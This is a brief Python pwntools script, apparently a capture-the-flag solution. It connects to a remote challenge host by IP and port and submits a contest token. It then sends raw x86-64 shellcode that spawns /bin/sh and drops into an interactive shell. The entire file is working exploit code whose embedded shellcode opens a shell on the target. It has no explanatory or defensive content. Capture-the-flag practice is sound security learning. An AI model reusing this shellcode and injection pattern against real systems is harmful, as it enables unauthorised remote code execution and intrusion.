from pwn import *

p = remote('202.38.93.241', 10000)
p.recvuntil('Please input your token: ')
p.sendline('2034:MEQCICoSjIfN2qS0hBHx2CBgEbmcuUC0nPYBWY4cn9lMSbV+AiBLwRKlORyCG8ZyN+WkqomKwjOt98ian34mvBuMtK48SQ==')
sc = '\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'
p.send(sc)
p.interactive()
